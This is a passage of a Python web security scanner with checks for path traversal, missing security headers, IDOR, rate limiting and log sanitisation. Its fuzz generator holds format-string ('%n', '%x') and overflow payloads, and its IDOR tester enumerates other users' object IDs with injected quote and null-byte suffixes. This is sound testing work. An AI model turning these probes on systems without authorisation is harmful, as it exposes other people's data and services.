                    vuln_type=VulnerabilityType.PATH_TRAVERSAL,
                    severity=VulnerabilitySeverity.HIGH,
                    title="Path Traversal Vulnerability",
                    description="Application allows reading arbitrary files from the filesystem.",
                    payload=payload,
                    evidence=f"Found signature: {signature}",
                    remediation=(
                        "Validate and sanitize user input. "
                        "Use a whitelist of allowed files/paths. "
                        "Use chroot jails or similar containment."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Path_Traversal",
                        "https://cwe.mitre.org/data/definitions/22.html",
                    ],
                    cwe="CWE-22",
                    owasp="A01:2021 - Broken Access Control",
                )

        return None

    def check_security_headers(
        self,
        headers: dict[str, str],
    ) -> list[VulnerabilityFinding]:
        """Check HTTP response headers for security misconfigurations.

        Args:
            headers: HTTP response headers to analyze.

        Returns:
            List of vulnerability findings for missing/misconfigured headers.
        """
        findings: list[VulnerabilityFinding] = []
        headers_lower = {k.lower(): v for k, v in headers.items()}

        security_headers = {
            "x-content-type-options": {
                "expected": "nosniff",
                "title": "Missing X-Content-Type-Options Header",
                "description": (
                    "Response lacks X-Content-Type-Options header, allowing MIME sniffing."
                ),
                "severity": VulnerabilitySeverity.LOW,
            },
            "x-frame-options": {
                "expected": ["deny", "sameorigin"],
                "title": "Missing X-Frame-Options Header",
                "description": "Response lacks X-Frame-Options header, allowing clickjacking.",
                "severity": VulnerabilitySeverity.MEDIUM,
            },
            "strict-transport-security": {
                "expected": "max-age=",
                "title": "Missing Strict-Transport-Security Header",
                "description": "Response lacks HSTS header, allowing downgrade attacks.",
                "severity": VulnerabilitySeverity.MEDIUM,
            },
            "content-security-policy": {
                "expected": None,
                "title": "Missing Content-Security-Policy Header",
                "description": "Response lacks CSP header, increasing XSS risk.",
                "severity": VulnerabilitySeverity.MEDIUM,
            },
            "x-xss-protection": {
                "expected": "1",
                "title": "Missing X-XSS-Protection Header",
                "description": "Response lacks X-XSS-Protection header.",
                "severity": VulnerabilitySeverity.LOW,
            },
            "referrer-policy": {
                "expected": None,
                "title": "Missing Referrer-Policy Header",
                "description": "Response lacks Referrer-Policy header, potentially leaking URLs.",
                "severity": VulnerabilitySeverity.LOW,
            },
            "permissions-policy": {
                "expected": None,
                "title": "Missing Permissions-Policy Header",
                "description": "Response lacks Permissions-Policy header.",
                "severity": VulnerabilitySeverity.INFO,
            },
        }

        for header_name, config in security_headers.items():
            if header_name not in headers_lower:
                findings.append(
                    VulnerabilityFinding(
                        vuln_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                        severity=config["severity"],
                        title=config["title"],
                        description=config["description"],
                        payload="",
                        remediation=f"Add the {header_name} header to all responses.",
                        references=["https://owasp.org/www-project-secure-headers/"],
                        owasp="A05:2021 - Security Misconfiguration",
                    )
                )

        server = headers_lower.get("server", "")
        if server:
            findings.append(
                VulnerabilityFinding(
                    vuln_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                    severity=VulnerabilitySeverity.INFO,
                    title="Server Version Disclosure",
                    description=f"Server header reveals version information: {server}",
                    payload="",
                    evidence=f"Server: {server}",
                    remediation="Configure server to hide version information.",
                    owasp="A01:2021 - Broken Access Control",
                )
            )

        powerby = headers_lower.get("x-powered-by", "")
        if powerby:
            findings.append(
                VulnerabilityFinding(
                    vuln_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                    severity=VulnerabilitySeverity.INFO,
                    title="Technology Stack Disclosure",
                    description=f"X-Powered-By header reveals technology: {powerby}",
                    payload="",
                    evidence=f"X-Powered-By: {powerby}",
                    remediation="Remove or obfuscate the X-Powered-By header.",
                    owasp="A01:2021 - Broken Access Control",
                )
            )

        return findings

    def generate_fuzz_input(
        self,
        input_type: str = "all",
        length: int = 100,
    ) -> Iterator[str]:
        """Generate fuzzing inputs for testing.

        Args:
            input_type: Type of fuzz input ('all', 'format', 'overflow', 'special').
            length: Maximum length for generated inputs.

        Yields:
            Fuzz input strings.
        """
        if input_type in ("all", "format"):
            yield from [
                "%s" * 10,
                "%n" * 10,
                "%x" * 10,
                "%p" * 10,
                "{0}" * 10,
                "{{}}" * 10,
                "${" * 10,
                "#{ expression }",
            ]

        if input_type in ("all", "overflow"):
            yield from [
                "A" * length,
                "A" * (length * 10),
                "A" * (length * 100),
                "\x00" * length,
                "\xff" * length,
            ]

        if input_type in ("all", "special"):
            yield from [
                "".join(string.punctuation),
                "".join(string.whitespace),
                "\\x00\\x01\\x02\\x03\\x04\\x05",
                "👨‍👩‍👧‍👦",
                "️" * 100,
            ]

    def sanitize_for_log(self, value: str, max_length: int = 200) -> str:
        """Sanitize a value for safe logging.

        Args:
            value: String value to sanitize.
            max_length: Maximum length for output.

        Returns:
            Sanitized string safe for logging.
        """
        if not value:
            return ""

        sanitized = value[:max_length]
        sanitized = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", sanitized)
        sanitized = sanitized.replace("\n", "\\n").replace("\r", "\\r")
        sanitized = html.escape(sanitized)

        return sanitized


class IDORTester:
    """Insecure Direct Object Reference (IDOR) testing utilities.

    Provides methods for testing IDOR vulnerabilities by manipulating
    object identifiers in requests.

    Example:
        >>> tester = IDORTester()
        >>> results = tester.test_sequential_ids("/api/users/{id}", auth_token)
    """

    def __init__(
        self,
        sequential_range: int = 10,
        include_patterns: list[str] | None = None,
    ) -> None:
        """Initialize the IDOR tester.

        Args:
            sequential_range: Range of sequential IDs to test.
            include_patterns: URL patterns to include in testing.
        """
        self.sequential_range = sequential_range
        self.include_patterns = include_patterns or []

    def generate_id_variations(
        self,
        original_id: str | int,
    ) -> Iterator[str | int]:
        """Generate variations of an identifier for IDOR testing.

        Args:
            original_id: The original identifier value.

        Yields:
            Identifier variations to test.
        """
        try:
            num_id = int(original_id)
            for i in range(max(0, num_id - self.sequential_range), num_id):
                yield i
            for i in range(num_id + 1, num_id + self.sequential_range + 1):
                yield i
        except (ValueError, TypeError):
            pass

        if isinstance(original_id, str):
            yield original_id[::-1]
            yield original_id.upper()
            yield original_id.lower()

            for char in ["'", '"', "\\x00", "%00", "''", '""']:
                yield f"{original_id}{char}"

    def check_idor_success(
        self,
        response_status: int,
        response_body: str,
        original_data: dict[str, Any] | None = None,
    ) -> VulnerabilityFinding | None:
        """Check if IDOR attempt was successful.

        Args:
            response_status: HTTP response status code.
            response_body: HTTP response body.
            original_data: Data from original authorized request.

        Returns:
            VulnerabilityFinding if IDOR detected, None otherwise.
        """
        if response_status == 200 and response_body:
            return VulnerabilityFinding(
                vuln_type=VulnerabilityType.IDOR,
                severity=VulnerabilitySeverity.HIGH,
                title="Insecure Direct Object Reference (IDOR)",
                description="Application allows access to resources belonging to other users.",
                payload="",
                evidence="Received 200 response for unauthorized resource access",
                remediation=(
                    "Implement proper access control checks. "
                    "Use indirect references (maps/guids) instead of direct IDs. "
                    "Verify user authorization before each resource access."
                ),
                references=[
                    "https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference",
                    "https://cwe.mitre.org/data/definitions/639.html",
                ],
                cwe="CWE-639",
                owasp="A01:2021 - Broken Access Control",
            )

        return None


class RateLimitTester:
    """Rate limiting testing utilities.

    Provides methods for testing rate limiting implementations.

    Example:
        >>> tester = RateLimitTester()
        >>> result = tester.test_rate_limit("/api/login", method="POST")
    """

    def __init__(
        self,
        default_threshold: int = 100,
        cooldown_seconds: float = 60.0,
    ) -> None:
        """Initialize the rate limit tester.

        Args:
            default_threshold: Default request threshold to test.
            cooldown_seconds: Cooldown period between test batches.
        """
        self.default_threshold = default_threshold
        self.cooldown_seconds = cooldown_seconds

    def analyze_rate_limit_headers(
        self,
        headers: dict[str, str],
    ) -> dict[str, Any]:
        """Analyze rate limiting headers.

        Args:
            headers: HTTP response headers.

        Returns:
            Dictionary with rate limit information.
        """
        result: dict[str, Any] = {
            "rate_limited": False,
            "limit": None,
            "remaining": None,
            "reset": None,
            "headers_found": [],
        }

        headers_lower = {k.lower(): v for k, v in headers.items()}

        rate_limit_headers = {
            "x-ratelimit-limit": "limit",
            "x-rate-limit-limit": "limit",
            "x-ratelimit-remaining": "remaining",
            "x-rate-limit-remaining": "remaining",
            "x-ratelimit-reset": "reset",
            "x-rate-limit-reset": "reset",
            "retry-after": "reset",
        }

        for header_name, key in rate_limit_headers.items():
            if header_name in headers_lower:
                result["headers_found"].append(header_name)
                try:
                    result[key] = int(headers_lower[header_name])
                except ValueError:
                    result[key] = headers_lower[header_name]

        result["rate_limited"] = bool(result["headers_found"])

        return result

    def check_rate_limit_vulnerability(
        self,
        requests_sent: int,
        response_status: int,
        headers: dict[str, str] | None = None,
    ) -> VulnerabilityFinding | None:
        """Check for rate limiting vulnerability.

        Args:
            requests_sent: Number of requests sent.
            response_status: Final response status code.
            headers: Response headers.

        Returns:
            VulnerabilityFinding if vulnerability detected, None otherwise.
        """
        if requests_sent >= self.default_threshold and response_status == 200:
            rate_info = self.analyze_rate_limit_headers(headers or {})

            if not rate_info["rate_limited"]:
                return VulnerabilityFinding(
                    vuln_type=VulnerabilityType.RATE_LIMITING,
                    severity=VulnerabilitySeverity.MEDIUM,
                    title="Missing Rate Limiting",
                    description=(
                        f"Application allowed {requests_sent} requests without rate limiting."
                    ),
                    payload="",
                    evidence=f"Sent {requests_sent} requests, all returned 200",
                    remediation=(
                        "Implement rate limiting for sensitive endpoints. "
                        "Use sliding window or token bucket algorithms. "
                        "Return 429 Too Many Requests when limit exceeded."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Denial_of_Service",
                    ],
                    owasp="A07:2021 - Identification and Authentication Failures",
                )

        return None
